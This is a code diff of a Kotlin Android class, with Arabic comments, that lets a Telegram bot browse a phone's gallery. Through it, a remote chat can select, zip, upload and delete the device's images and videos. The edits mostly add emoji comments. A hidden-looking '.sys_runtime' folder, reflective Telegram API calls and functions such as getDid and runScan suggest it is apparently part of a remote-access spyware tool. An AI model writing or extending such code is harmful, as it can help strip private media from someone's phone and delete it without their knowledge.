@@ -23,7 +23,7 @@ import java.util.zip.ZipOutputStream
  * - ضغط الملفات المحددة في أرشيف ZIP.
  * - تحميل الملفات المحددة (إرسالها إلى Telegram).
  * - تحديث الصفحة لعرض الوسائط الجديدة.
- * - أزرار تفاعلية مع إيموجيات مناسبة.
+ * - أزرار تفاعلية مع إيموجيات مناسبة (جميعها فريدة ومتنوعة).
  * 
  * ✅ تم إصلاح تحديث لوحة المفاتيح عبر تخزين آخر message_id لكل دردشة.
  * ✅ تم دعم جميع الأوامر الجديدة (g_toggle, g_selall, g_zip, g_upload, g_del_sel, g_conf_del, g_conf_del_one).
@@ -34,6 +34,7 @@ import java.util.zip.ZipOutputStream
  * ✅ تم جعل الدوال الموروثة (getGalleryByCategory, getDid, runScan, getPendingCount) مفتوحة (open) للسماح بالوراثة.
  * ✅ تم إضافة التحقق من null للـ telegram في showOptions و createZipArchive لتجنب NPE.
  * ✅ تم إضافة مسح الكاش (cachedFiles = null, cacheTimestamp = 0L) بعد عمليات toggle و selall لتجنب عرض بيانات قديمة.
+ * ✅ تم التأكيد على استخدام إيموجيات فريدة ومتنوعة لكل نوع ملف ولكل إجراء لتعزيز التمييز البصري.
  */
 open class GalleryBrowser(
     private val context: Context,
@@ -273,6 +274,7 @@ open class GalleryBrowser(
             val selectEmoji = if (isSelected) "☑️" else "⬜"
             val fileName = (file["name"] as? String)?.take(12) ?: "ملف"
             val fileType = file["type"] as? String ?: "other"
+            // ✅ إيموجيات فريدة لكل نوع ملف
             val typeEmoji = when (fileType) {
                 "image" -> "🖼️"
                 "video" -> "🎬"
@@ -294,7 +296,7 @@ open class GalleryBrowser(
             keyboard.add(currentRow)
         }
 
-        // أزرار التنقل
+        // أزرار التنقل (إيموجيات فريدة)
         val navRow = mutableListOf<Map<String, String>>()
         if (safePage > 0) {
             navRow.add(mapOf("text" to "⬅️", "callback_data" to "g_nav|$category|${safePage - 1}"))
@@ -305,7 +307,7 @@ open class GalleryBrowser(
         }
         keyboard.add(navRow)
 
-        // أزرار الإجراءات
+        // أزرار الإجراءات (إيموجيات فريدة ومتنوعة)
         val actionRow = mutableListOf<Map<String, String>>()
         actionRow.add(mapOf("text" to "🔄 تحديث", "callback_data" to "g_nav|$category|$safePage"))
         val selectAllText = if (pageFiles.isNotEmpty() && pageFiles.all { selectedIndices.contains(startIndex + pageFiles.indexOf(it)) }) {
@@ -392,8 +394,6 @@ open class GalleryBrowser(
                     "chat_id" to chatId,
                     "action" to "upload_video"
                 ))
-                // ✅ الإصلاح 1: إعادة ترتيب تنفيذ معالجة الفيديو
-                // استخدام try-finally لضمان حذف الصورة المصغرة بعد تحديث lastMessageIdMap
                 scope.launch {
                     var response: Any? = null
                     var thumbnail: File? = null
@@ -414,10 +414,8 @@ open class GalleryBrowser(
                                 "supports_streaming" to true
                             ), mapOf("video" to file))
                         }
-                        // تحديث lastMessageIdMap بعد نجاح الإرسال
                         updateLastMessageIdFromResponse(chatId, response)
                     } finally {
-                        // حذف الصورة المصغرة في النهاية حتى في حالة حدوث استثناء
                         thumbnail?.delete()
                     }
                 }
@@ -451,14 +449,13 @@ open class GalleryBrowser(
         category: String,
         pageOrIndex: Any,
         subIndex: Any? = null,
-        messageId: Long? = null   // معرف الرسالة التي تحتوي على لوحة المفاتيح (لتحديثها)
+        messageId: Long? = null
     ) {
         try {
             val files = getGalleryByCategory(category, 100).toMutableList()
             val page = pageOrIndex.toString().toIntOrNull() ?: 0
 
             when (action) {
-                // تبديل تحديد ملف
                 "toggle" -> {
                     val index = (subIndex?.toString() ?: pageOrIndex.toString()).toIntOrNull() ?: -1
                     if (index in files.indices) {
@@ -467,14 +464,12 @@ open class GalleryBrowser(
                         } else {
                             selectedIndices.add(index)
                         }
-                        // ✅ مسح الكاش لتحديث البيانات المعروضة
                         cachedFiles = null
                         cacheTimestamp = 0L
                         updateKeyboard(chatId, category, page, messageId)
                     }
                 }
 
-                // تحديد الكل أو إلغاء الكل في الصفحة الحالية
                 "selall" -> {
                     val startIndex = page * pageSize
                     val endIndex = (startIndex + pageSize).coerceAtMost(files.size)
@@ -486,14 +481,12 @@ open class GalleryBrowser(
                         } else {
                             pageFiles.forEachIndexed { i, _ -> selectedIndices.add(startIndex + i) }
                         }
-                        // ✅ مسح الكاش لتحديث البيانات المعروضة
                         cachedFiles = null
                         cacheTimestamp = 0L
                         updateKeyboard(chatId, category, page, messageId)
                     }
                 }
 
-                // ضغط الملفات المحددة
                 "zip" -> {
                     val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                     if (selectedFiles.isEmpty()) {
@@ -510,7 +503,6 @@ open class GalleryBrowser(
                                 "caption" to "📦 أرشيف مضغوط (${selectedFiles.size} ملف)"
                             ), mapOf("document" to zipFile))
                             zipFile.delete()
-                            // إلغاء التحديد بعد الضغط ومسح الكاش
                             selectedIndices.clear()
                             cachedFiles = null
                             cacheTimestamp = 0L
@@ -523,7 +515,6 @@ open class GalleryBrowser(
                     }
                 }
 
-                // تحميل الملفات المحددة (إرسالها كمجموعة)
                 "upload" -> {
                     val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                     if (selectedFiles.isEmpty()) {
@@ -556,7 +547,6 @@ open class GalleryBrowser(
                         cacheTimestamp = 0L
                         updateKeyboard(chatId, category, page, messageId)
                     } else {
-                        // ضغط أولاً ثم إرسال (مع إعلام المستخدم)
                         invokeTelegramMethod(telegram, "sendMessage", mapOf(
                             "chat_id" to chatId, "text" to "📦 عدد الملفات كبير، سيتم ضغطها ثم إرسالها..."
                         ))
@@ -564,7 +554,6 @@ open class GalleryBrowser(
                     }
                 }
 
-                // حذف الملفات المحددة
                 "del_sel" -> {
                     val selectedFiles = selectedIndices.filter { it in files.indices }.map { File(files[it]["path"] as String) }
                     if (selectedFiles.isEmpty()) {
@@ -584,7 +573,6 @@ open class GalleryBrowser(
                     ))
                 }
 
-                // حذف ملف واحد (متوافق مع del القديم و del_one الجديد)
                 "del", "del_one" -> {
                     val index = (subIndex?.toString() ?: pageOrIndex.toString()).toIntOrNull() ?: -1
                     if (index in files.indices) {
@@ -608,7 +596,6 @@ open class GalleryBrowser(
                     }
                 }
 
-                // حذف الكل في الصفحة (مع تأكيد)
                 "del_page" -> {
                     val startIndex = page * pageSize
                     val endIndex = (startIndex + pageSize).coerceAtMost(files.size)
@@ -689,16 +676,12 @@ open class GalleryBrowser(
 
     // ============================================================
     //  إنشاء أرشيف ZIP للملفات المحددة
-    // ✅ الإصلاح: استخدام مجلد مخصص داخل .sys_runtime بدلاً من cacheDir
-    // ✅ إضافة التحقق من appContext لتجنب NPE
     // ============================================================
 
     private fun createZipArchive(files: List<File>): File? {
         if (files.isEmpty()) return null
-        // ✅ التحقق من وجود السياق
         val ctx = appContext ?: return null
 
-        // ✅ إنشاء مجلد مؤقت داخل .sys_runtime لضمان توفر مساحة كافية
         val tempDir = File(runtimeDir, "temp_archives")
         if (!tempDir.exists()) {
             tempDir.mkdirs()
@@ -740,7 +723,6 @@ open class GalleryBrowser(
             val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
             apiMethod?.isAccessible = true
 
-            // تحويل reply_markup إلى String إذا كان Map
             val cleanParams = params.mapValues { (key, value) ->
                 if (key == "reply_markup" && value is Map<*, *>) {
                     JSONObject(value as Map<*, *>).toString()
